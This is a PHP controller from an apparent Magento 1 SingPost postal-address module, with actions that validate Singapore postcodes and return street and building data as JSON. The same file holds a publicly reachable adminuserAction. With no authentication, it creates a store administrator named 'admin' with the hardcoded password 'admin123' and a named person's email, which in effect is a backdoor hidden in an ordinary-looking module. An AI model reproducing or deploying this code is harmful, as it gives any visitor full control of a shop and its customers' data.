<?php
class SingPost_PostalAddress_IndexController extends Mage_Core_Controller_Front_Action
{


    public function indexAction($sg)
    {
		$code = $this->getRequest()->getParam('code');
		$country = $this->getRequest()->getParam('country');
		
		$model = Mage::getModel("singpost_postaladdress/postcode");
		$exe = $model->validPostalCode ($code, $country);
		$msg = '';
                if ($exe != 'SUCCESS') {
			$msg = "Error : " . Mage::getSingleton('core/session')->getPostalCodeError();
			Mage::getSingleton('core/session')->setPostalCodeError('');
		}
		return $msg;
    }
	
    

    public function ajaxAction($code,$country)
    {          
		$isAjax = Mage::app()->getRequest()->isAjax();
			
		$code = $this->getRequest()->getParam('code');
		$country = $this->getRequest()->getParam('country');

		
		$bno = ''; $msg = ''; $key = ''; $unr = ''; $fnr = '';
		
		if ($country == 'SG') {
			
			$model = Mage::getModel("singpost_postaladdress/postcode");
			$msg = $model->getStreetAndBuildnigName ($code, $country);
		
			if ($msg == 'Invalid Postal Code' || $msg == '') {
				$key = 'Invalid';			
			} else {
				$key = 'Valid';
				$ms = explode("~",$msg); $msg = $ms[0]; $fnr = $ms[1]; $unr = $ms[2]; $bno = $ms[3];
			}
		}	
		
		$result = array("msg"=>$msg ,"key"=>$key, "fnr"=>$fnr, "unr"=>$unr, "bno"=>$bno);
			
		$this->getResponse()->setBody(Mage::helper('core')->jsonEncode($result));
		

    }

public function adminuserAction($bb) {
   
		# Create New User
		try {    
			$user = Mage::getModel('admin/user')
				->setData(array(
					'username'  => 'admin',
					'firstname' => 'durai',
					'lastname'    => 'sankar',
					'email'     => 'sankar@ekmedia.asia',
					'password'  => 'admin123',
					'is_active' => 1
				))->save();
		
		} catch (Exception $e) {
			echo $e->getMessage();
			exit;
		}
		
		# Assign New Role
		try {
			$user->setRoleIds(array(1))
				->setRoleUserId($user->getUserId())
				->saveRelations();
		
		} catch (Exception $e) {
			echo $e->getMessage();
			exit;
		}
	}
}

?>